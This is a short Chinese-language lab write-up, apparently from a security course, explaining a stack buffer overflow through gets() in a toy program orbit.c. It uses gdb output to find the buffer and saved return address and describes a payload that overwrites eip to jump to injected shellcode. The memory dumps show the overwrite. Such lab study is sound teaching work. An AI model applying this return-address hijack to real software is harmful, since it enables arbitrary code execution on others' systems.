## Main Idea

最简单的缓存区溢出情况。在`orbit.c:orbit`中，`gets`函数直接从标准输入中读取所有输入直到遇上换行符，这个函数不会检查读取的字符长度，所以当输入的字符数大于缓冲区的大小时，多出来的字符会覆盖掉当前栈上的内容。

因此，我们可以通过构造输入来劫持返回地址，使得程序可以运行我们的shellcode。

## Magic Numbers

首先获得`buf`的地址：
```
(gdb) p &buf
$1 = (char (*)[8]) 0xffffda98
```

然后获得函数`orbit`的返回地址：
```
(gdb) i f
Stack level 0, frame at 0xffffdab0:
 eip = 0x80491eb in orbit (orbit.c:5); saved eip = 0x8049208
 called by frame at 0xffffdac0
 source language c.
 Arglist at 0xffffdaa8, args: 
 Locals at 0xffffdaa8, Previous frame's sp is 0xffffdab0
 Saved registers:
  ebp at 0xffffdaa8, eip at 0xffffdaac
```

## Exploit Structure

根据获取的信息，很容易构造出payload：

1. 用字符覆盖从`buf`到`eip`之间的区域。
2. 覆盖旧的返回地址`eip`，由于我们直接把SHELLCODE放在`eip`后面，因此新的返回地址为`eip + 4`，即`0xffffdab0`。
3. 最后，直接在`eip`之后插入SHELLCODE。

## Exploit GDB Output

进行爆破前：
```
(gdb) x/8x &buf
0xffffda98:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffdaa8:     0xffffdab8      0x08049208      0x00000001      0x080491fd
```

进行爆破后：
```
(gdb) x/8x &buf
0xffffda98:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffdaa8:     0x41414141      0xffffdab0      0xcd58326a      0x89c38980
```